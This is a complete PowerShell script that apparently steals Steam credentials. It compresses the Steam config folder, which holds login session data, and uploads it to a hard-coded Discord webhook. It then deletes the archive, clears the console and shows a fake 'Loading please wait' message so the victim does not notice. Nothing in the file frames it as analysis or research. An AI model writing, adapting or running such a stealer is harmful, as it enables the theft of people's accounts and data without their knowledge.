# Define variables
$folderPath = "C:\Program Files (x86)\Steam\config"
$zipPath = "C:\Program Files (x86)\Steam\config.zip"
$webhookUrl = "https://discord.com/api/webhooks/1313276312785387630/mEg3aAlhf1T_jYIWVcukXUP68k_f5JkbrV_VHCqfB8R8IwOn3pQ6G2QQui3d_xgumMzt"

# Compress the folder into a ZIP file
Compress-Archive -Path $folderPath -DestinationPath $zipPath

# Create a JSON payload with the file
$boundary = [System.Guid]::NewGuid().ToString()
$headers = @{
    'Content-Type' = "multipart/form-data; boundary=`"$boundary`""
}

$payload = @"
--$boundary
Content-Disposition: form-data; name="file"; filename="config.zip"
Content-Type: application/octet-stream

$(Get-Content -Raw -Path $zipPath)
--$boundary--
"@

# Send the ZIP file to the Discord webhook
Invoke-RestMethod -Uri $webhookUrl -Method Post -Headers $headers -Body $payload

# Clean up
Remove-Item -Path $zipPath
cls
Write-Host "Loading please wait."
Start-Sleep -s 10  # Simulate script processing time
Write-Host "Finished."
